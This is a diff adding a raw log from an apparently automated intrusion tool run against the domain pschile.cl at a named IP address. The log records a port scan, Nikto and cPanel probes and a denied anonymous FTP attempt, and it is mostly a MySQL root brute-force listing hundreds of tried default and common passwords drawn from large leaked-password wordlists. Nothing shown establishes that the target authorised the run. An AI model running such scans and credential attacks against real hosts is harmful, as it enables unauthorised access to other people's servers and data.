@@ -1,0 +1,371 @@
+===== DNS RESOLUTION =====
+[DNS] pschile.cl → 162.241.218.115
+
+[SCAN] pschile.cl (162.241.218.115) — TOP 100
+[DEBUG] Waiting for 61 threads...
+  [HIGH] Port 21 (FTP) — OPEN
+  [LOW] Port 25 (SMTP) — OPEN
+  [LOW] Port 1723 (Unknown) — OPEN
+  [LOW] Port 53 (DNS) — OPEN
+  [HIGH] Port 2222 (SSH) — OPEN
+  [LOW] Port 143 (IMAP) — OPEN
+  [HIGH] Port 2083 (cPanel) — OPEN
+  [LOW] Port 993 (Unknown) — OPEN
+  [LOW] Port 22 (SSH) — OPEN
+  [LOW] Port 465 (Unknown) — OPEN
+  [LOW] Port 587 (Unknown) — OPEN
+  [LOW] Port 995 (Unknown) — OPEN
+  [LOW] Port 110 (POP3) — OPEN
+  [LOW] Port 443 (HTTPS) — OPEN
+  [HIGH] Port 3306 (MySQL) — OPEN
+  [LOW] Port 2096 (Unknown) — OPEN
+  [HIGH] Port 5432 (PostgreSQL) — OPEN
+  [LOW] Port 80 (HTTP) — OPEN
+[DEBUG] Done. Open ports: 18
+
+===== SCAN SUMMARY =====
+
+[pschile-qa] pschile.cl (162.241.218.115)
+  Port    21 (FTP            ) — HIGH
+  Port    22 (SSH            ) — LOW
+  Port    25 (SMTP           ) — LOW
+  Port    53 (DNS            ) — LOW
+  Port    80 (HTTP           ) — LOW
+  Port   110 (POP3           ) — LOW
+  Port   143 (IMAP           ) — LOW
+  Port   443 (HTTPS          ) — LOW
+  Port   465 (Unknown        ) — LOW
+  Port   587 (Unknown        ) — LOW
+  Port   993 (Unknown        ) — LOW
+  Port   995 (Unknown        ) — LOW
+  Port  1723 (Unknown        ) — LOW
+  Port  2083 (cPanel         ) — HIGH
+  Port  2096 (Unknown        ) — LOW
+  Port  2222 (SSH            ) — HIGH
+  Port  3306 (MySQL          ) — HIGH
+  Port  5432 (PostgreSQL     ) — HIGH
+
+[EXPORT] Results saved to reports/results.json
+[EXPORT] Results appended to reports/results.csv
+
+[ROUTER] Checking extractors for pschile.cl (162.241.218.115)
+  [CDN] pschile.cl is not behind Cloudflare — skipping bypass
+
+  [WPScan] Targeting https://pschile.cl
+  [WPScan] Not installed — skipping (run: gem install wpscan)
+
+  [Nikto] Targeting pschile.cl:443
+  [Nikto] Running: nikto -host pschile.cl -port 443 -Format csv -nointeractive -Tuning x9 -timeout 10 -ssl
+  [Nikto] Scan complete — 0 findings (0 HIGH, 0 MEDIUM, 0 INFO)
+
+  [cPanel] Targeting pschile.cl:2083
+  [cPanel] Could not reach login page
+
+  [CONFIG] Scraping config files on pschile.cl
+  [CONFIG] No exposed config files found
+  [MATCH] Port 21 (FTP) — launching extractor
+  [FTP] Connecting to 162.241.218.115:21
+  [FTP] Banner: 220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 4 of 150 allowed.
+220-Local time is now 20:00. Server port: 21.
+220 You will be disconnected after 15 minutes of inactivity.
+  [FTP] Anonymous login denied
+  [SKIP] Port 22 (SSH) — no extractor available
+  [SKIP] Port 25 (SMTP) — no extractor available
+  [SKIP] Port 53 (DNS) — no extractor available
+  [SKIP] Port 80 (HTTP) — no extractor available
+  [SKIP] Port 110 (POP3) — no extractor available
+  [SKIP] Port 143 (IMAP) — no extractor available
+  [SKIP] Port 443 (HTTPS) — no extractor available
+  [SKIP] Port 465 (Unknown) — no extractor available
+  [SKIP] Port 587 (Unknown) — no extractor available
+  [SKIP] Port 993 (Unknown) — no extractor available
+  [SKIP] Port 995 (Unknown) — no extractor available
+  [SKIP] Port 1723 (Unknown) — no extractor available
+  [SKIP] Port 2083 (cPanel) — no extractor available
+  [SKIP] Port 2096 (Unknown) — no extractor available
+  [SKIP] Port 2222 (SSH) — no extractor available
+  [MATCH] Port 3306 (MySQL) — launching extractor
+  [MySQL] Connecting to 162.241.218.115:3306
+  [MySQL] Version: unknown
+  [MySQL] Loaded 3 entries from user-10-million-usernames-dup.txt
+  [MySQL] Loaded 716 entries from pass-10-million-passwords-1000000.txt
+  [MySQL] Testing 2148 combinations...
+  [MySQL] Error testing root:root: no_salt
+  [MySQL] Error testing root:admin: no_salt
+  [MySQL] Error testing root:1234: no_salt
+  [MySQL] Error testing root:user: no_salt
+  [MySQL] Error testing root:Administrator: no_salt
+  [MySQL] Error testing root:administrador: no_salt
+  [MySQL] Error testing root:usuario2: no_salt
+  [MySQL] Error testing root:usuario: no_salt
+  [MySQL] Error testing root:user4: no_salt
+  [MySQL] Error testing root:user3: no_salt
+  [MySQL] Error testing root:user2: no_salt
+  [MySQL] Error testing root:user1: no_salt
+  [MySQL] Error testing root:12345: no_salt
+  [MySQL] Error testing root:123456: no_salt
+  [MySQL] Error testing root:daemon: no_salt
+  [MySQL] Error testing root:bin: no_salt
+  [MySQL] Error testing root:sys: no_salt
+  [MySQL] Error testing root:sync: no_salt
+  [MySQL] Error testing root:games: no_salt
+  [MySQL] Error testing root:man: no_salt
+  [MySQL] Error testing root:lp: no_salt
+  [MySQL] Error testing root:mail: no_salt
+  [MySQL] Error testing root:news: no_salt
+  [MySQL] Error testing root:uucp: no_salt
+  [MySQL] Error testing root:proxy: no_salt
+  [MySQL] Error testing root:www-data: no_salt
+  [MySQL] Error testing root:backup: no_salt
+  [MySQL] Error testing root:nobody: no_salt
+  [MySQL] Error testing root:a: no_salt
+  [MySQL] Error testing root:welcome123: no_salt
+  [MySQL] Error testing root:welcome: no_salt
+  [MySQL] Error testing root:webmaster: no_salt
+  [MySQL] Error testing root:webadmin: no_salt
+  [MySQL] Error testing root:vision: no_salt
+  [MySQL] Error testing root:valentin: no_salt
+  [MySQL] Error testing root:uuidd: no_salt
+  [MySQL] Error testing root:uploader: no_salt
+  [MySQL] Error testing root:unknown: no_salt
+  [MySQL] Error testing root:ubuntu: no_salt
+  [MySQL] Error testing root:ubnt: no_salt
+  [MySQL] Error testing root:trustno1: no_salt
+  [MySQL] Error testing root:toor: no_salt
+  [MySQL] Error testing root:tomcat: no_salt
+  [MySQL] Error testing root:thomas: no_salt
+  [MySQL] Error testing root:testtest: no_salt
+  [MySQL] Error testing root:test123: no_salt
+  [MySQL] Error testing root:test: no_salt
+  [MySQL] Error testing root:temptemp: no_salt
+  [MySQL] Error testing root:temporary: no_salt
+  [MySQL] Error testing root:temporal: no_salt
+  [MySQL] Error testing root:temp123: no_salt
+  [MySQL] Error testing root:tang: no_salt
+  [MySQL] Error testing root:systemadministrator: no_salt
+  [MySQL] Error testing root:systemadmin: no_salt
+  [MySQL] Error testing root:system32: no_salt
+  [MySQL] Error testing root:system: no_salt
+  [MySQL] Error testing root:sysadmin: no_salt
+  [MySQL] Error testing root:sys: no_salt
+  [MySQL] Error testing root:sybase: no_salt
+  [MySQL] Error testing root:support: no_salt
+  [MySQL] Error testing root:supervisor: no_salt
+  [MySQL] Error testing root:superuser: no_salt
+  [MySQL] Error testing root:supernic.cn: no_salt
+  [MySQL] Error testing root:superadmin: no_salt
+  [MySQL] Error testing root:super: no_salt
+  [MySQL] Error testing root:sunshine: no_salt
+  [MySQL] Error testing root:sudo: no_salt
+  [MySQL] Error testing root:student: no_salt
+  [MySQL] Error testing root:start123: no_salt
+  [MySQL] Error testing root:sshd: no_salt
+  [MySQL] Error testing root:soporte: no_salt
+  [MySQL] Error testing root:soadmin: no_salt
+  [MySQL] Error testing root:siadmin: no_salt
+  [MySQL] Error testing root:shisp.com: no_salt
+  [MySQL] Error testing root:shirley: no_salt
+  [MySQL] Error testing root:share: no_salt
+  [MySQL] Error testing root:shangdi: no_salt
+  [MySQL] Error testing root:shadow: no_salt
+  [MySQL] Error testing root:server: no_salt
+  [MySQL] Error testing root:security: no_salt
+  [MySQL] Error testing root:secure: no_salt
+  [MySQL] Error testing root:secret: no_salt
+  [MySQL] Error testing root:samsung: no_salt
+  [MySQL] Error testing root:sample: no_salt
+  [MySQL] Error testing root:s123456: no_salt
+  [MySQL] Error testing root:rootrootroot: no_salt
+  [MySQL] Error testing root:rootroot: no_salt
+  [MySQL] Error testing root:rootpass: no_salt
+  [MySQL] Error testing root:root_passwd: no_salt
+  [MySQL] Error testing root:rootme: no_salt
+  [MySQL] Error testing root:roota: no_salt
+  [MySQL] Error testing root:root2: no_salt
+  [MySQL] Error testing root:root123456789: no_salt
+  [MySQL] Error testing root:root12345678: no_salt
+  [MySQL] Error testing root:root1234567: no_salt
+  [MySQL] Error testing root:root123456: no_salt
+  [MySQL] Error testing root:root12345: no_salt
+  [MySQL] Error testing root:root1234: no_salt
+  [MySQL] Error testing root:root123: no_salt
+  [MySQL] Error testing root:root12: no_salt
+  [MySQL] Error testing root:root1: no_salt
+  [MySQL] Error testing root:root001: no_salt
+  [MySQL] Error testing root:root00: no_salt
+  [MySQL] Error testing root:root@123: no_salt
+  [MySQL] Error testing root:root!@#$: no_salt
+  [MySQL] Error testing root:rkqldk: no_salt
+  [MySQL] Error testing root:ripper: no_salt
+  [MySQL] Error testing root:redhat: no_salt
+  [MySQL] Error testing root:radmin: no_salt
+  [MySQL] Error testing root:r00t123: no_salt
+  [MySQL] Error testing root:r00t: no_salt
+  [MySQL] Error testing root:pepe: no_salt
+  [MySQL] Error testing root:owner: no_salt
+  [MySQL] Error testing root:owaspbwa: no_salt
+  [MySQL] Error testing root:ossuser: no_salt
+  [MySQL] Error testing root:ossadm: no_salt
+  [MySQL] Error testing root:osmuuser: no_salt
+  [MySQL] Error testing root:os10+ZTE: no_salt
+  [MySQL] Error testing root:oracle1: no_salt
+  [MySQL] Error testing root:oracle: no_salt
+  [MySQL] Error testing root:operador: no_salt
+  [MySQL] Error testing root:okokok: no_salt
+  [MySQL] Error testing root:office: no_salt
+  [MySQL] Error testing root:nothing: no_salt
+  [MySQL] Error testing root:nopassword: no_salt
+  [MySQL] Error testing root:nopass: no_salt
+  [MySQL] Error testing root:nobody: no_salt
+  [MySQL] Error testing root:nimda: no_salt
+  [MySQL] Error testing root:netuser: no_salt
+  [MySQL] Error testing root:netman: no_salt
+  [MySQL] Error testing root:netamin: no_salt
+  [MySQL] Error testing root:nagios: no_salt
+  [MySQL] Error testing root:mysql: no_salt
+  [MySQL] Error testing root:mypc123: no_salt
+  [MySQL] Error testing root:mypassword: no_salt
+  [MySQL] Error testing root:mypass: no_salt
+  [MySQL] Error testing root:msfadmin: no_salt
+  [MySQL] Error testing root:monkey: no_salt
+  [MySQL] Error testing root:monitor: no_salt
+  [MySQL] Error testing root:money: no_salt
+  [MySQL] Error testing root:meiyoumima: no_salt
+  [MySQL] Error testing root:masterkey: no_salt
+  [MySQL] Error testing root:master123: no_salt
+  [MySQL] Error testing root:master: no_salt
+  [MySQL] Error testing root:market: no_salt
+  [MySQL] Error testing root:mario: no_salt
+  [MySQL] Error testing root:manager: no_salt
+  [MySQL] Error testing root:mailadmin: no_salt
+  [MySQL] Error testing root:mail: no_salt
+  [MySQL] Error testing root:love123: no_salt
+  [MySQL] Error testing root:lotus: no_salt
+  [MySQL] Error testing root:Login: no_salt
+  [MySQL] Error testing root:linux: no_salt
+  [MySQL] Error testing root:letmein: no_salt
+  [MySQL] Error testing root:letitbe: no_salt
+  [MySQL] Error testing root:lennon: no_salt
+  [MySQL] Error testing root:ldap: no_salt
+  [MySQL] Error testing root:lalala: no_salt
+  [MySQL] Error testing root:killer: no_salt
+  [MySQL] Error testing root:jupiter: no_salt
+  [MySQL] Error testing root:joebob: no_salt
+  [MySQL] Error testing root:intranet: no_salt
+  [MySQL] Error testing root:Internet: no_salt
+  [MySQL] Error testing root:info: no_salt
+  [MySQL] Error testing root:iloveyou: no_salt
+  [MySQL] Error testing root:ihavenopass: no_salt
+  [MySQL] Error testing root:idcidc: no_salt
+  [MySQL] Error testing root:idc123: no_salt
+  [MySQL] Error testing root:huawei: no_salt
+  [MySQL] Error testing root:home123: no_salt
+  [MySQL] Error testing root:guest: no_salt
+  [MySQL] Error testing root:genesis: no_salt
+  [MySQL] Error testing root:games: no_salt
+  [MySQL] Error testing root:ftp: no_salt
+  [MySQL] Error testing root:freedom: no_salt
+  [MySQL] Error testing root:forever: no_salt
+  [MySQL] Error testing root:foofoo: no_salt
+  [MySQL] Error testing root:foobar: no_salt
+  [MySQL] Error testing root:firewall: no_salt
+  [MySQL] Error testing root:files: no_salt
+  [MySQL] Error testing root:explorer: no_salt
+  [MySQL] Error testing root:exchange: no_salt
+  [MySQL] Error testing root:example: no_salt
+  [MySQL] Error testing root:ericsson: no_salt
+  [MySQL] Error testing root:energy: no_salt
+  [MySQL] Error testing root:dragon: no_salt
+  [MySQL] Error testing root:domain: no_salt
+  [MySQL] Error testing root:desktop: no_salt
+  [MySQL] Error testing root:default: no_salt
+  [MySQL] Error testing root:dbuser: no_salt
+  [MySQL] Error testing root:database: no_salt
+  [MySQL] Error testing root:data: no_salt
+  [MySQL] Error testing root:danny: no_salt
+  [MySQL] Error testing root:daniel: no_salt
+  [MySQL] Error testing root:daemon: no_salt
+  [MySQL] Error testing root:customer: no_salt
+  [MySQL] Error testing root:cookie: no_salt
+  [MySQL] Error testing root:controller: no_salt
+  [MySQL] Error testing root:computer: no_salt
+  [MySQL] Error testing root:coffee: no_salt
+  [MySQL] Error testing root:codeword: no_salt
+  [MySQL] Error testing root:codename: no_salt
+  [MySQL] Error testing root:cluster: no_salt
+  [MySQL] Error testing root:clone: no_salt
+  [MySQL] Error testing root:cisco123: no_salt
+  [MySQL] Error testing root:cisco: no_salt
+  [MySQL] Error testing root:caonimabi: no_salt
+  [MySQL] Error testing root:caonima: no_salt
+  [MySQL] Error testing root:campus: no_salt
+  [MySQL] Error testing root:calvin: no_salt
+  [MySQL] Error testing root:CactiEZ: no_salt
+  [MySQL] Error testing root:business: no_salt
+  [MySQL] Error testing root:boss123: no_salt
+  [MySQL] Error testing root:boot: no_salt
+  [MySQL] Error testing root:bee: no_salt
+  [MySQL] Error testing root:backupuer: no_salt
+  [MySQL] Error testing root:backup: no_salt
+  [MySQL] Error testing root:avonline: no_salt
+  [MySQL] Error testing root:asdzxc: no_salt
+  [MySQL] Error testing root:asdsa: no_salt
+  [MySQL] Error testing root:asdfgh: no_salt
+  [MySQL] Error testing root:asdfg: no_salt
+  [MySQL] Error testing root:asddsa: no_salt
+  [MySQL] Error testing root:asdasd: no_salt
+  [MySQL] Error testing root:asd12345: no_salt
+  [MySQL] Error testing root:apple: no_salt
+  [MySQL] Error testing root:anything: no_salt
+  [MySQL] Error testing root:antonio: no_salt
+  [MySQL] Error testing root:anonymous: no_salt
+  [MySQL] Error testing root:Anonymous: no_salt
+  [MySQL] Error testing root:angel123: no_salt
+  [MySQL] Error testing root:alpine: no_salt
+  [MySQL] Error testing root:alpin: no_salt
+  [MySQL] Error testing root:adminsupport: no_salt
+  [MySQL] Error testing root:zeosx: no_salt
+  [MySQL] Error testing root:YES: no_salt
+  [MySQL] Error testing root:year2000: no_salt
+  [MySQL] Error testing root:xyzall: no_salt
+  [MySQL] Error testing root:xxyyzz: no_salt
+  [MySQL] Error testing root:xo11nE: no_salt
+  [MySQL] Error testing root:XLSERVER: no_salt
+  [MySQL] Error testing root:xdfk9874t3: no_salt
+  [MySQL] Error testing root:WORD: no_salt
+  [MySQL] Error testing root:WOOD: no_salt
+  [MySQL] Error testing root:WONDERLAND: no_salt
+  [MySQL] Error testing root:wodj: no_salt
+  [MySQL] Error testing root:winterm: no_salt
+  [MySQL] Error testing root:WINDOWS_PASSTHRU: no_salt
+  [MySQL] Error testing root:wg: no_salt
+  [MySQL] Error testing root:weblogic: no_salt
+  [MySQL] Error testing root:webibm: no_salt
+  [MySQL] Error testing root:webdb: no_salt
+  [MySQL] Error testing root:WebBoard: no_salt
+  [MySQL] Error testing root:WANGTEK: no_salt
+  [MySQL] Error testing root:VRR1: no_salt
+  [MySQL] Error testing root:volition: no_salt
+  [MySQL] Error testing root:VESOFT: no_salt
+  [MySQL] Error testing root:vertex25: no_salt
+  [MySQL] Error testing root:uucp: no_salt
+  [MySQL] Error testing root:USER8: no_salt
+  [MySQL] Error testing root:USER6: no_salt
+  [MySQL] Error testing root:USER0: no_salt
+  [MySQL] Error testing root:USER_TEMPLATE: no_salt
+  [MySQL] Error testing root:unix: no_salt
+  [MySQL] Error testing root:umountfsys: no_salt
+  [MySQL] Error testing root:UI-PSWD-02: no_salt
+  [MySQL] Error testing root:UI-PSWD-01: no_salt
+  [MySQL] Error testing root:uClinux: no_salt
+  [MySQL] Error testing root:TTPTHA: no_salt
+  [MySQL] Error testing root:TSDEV: no_salt
+  [MySQL] Error testing root:trouble: no_salt
+  [MySQL] Error testing root:trocse: no_salt
+  [MySQL] Error testing root:Trintech: no_salt
+  [MySQL] Error testing root:trade: no_salt
+  [MySQL] Error testing root:tracell: no_salt
+  [MySQL] Error testing root:toshy99: no_salt
+  [MySQL] Error testing root:Toshiba: no_salt
+  [MySQL] Error testing root:toplayer: no_salt
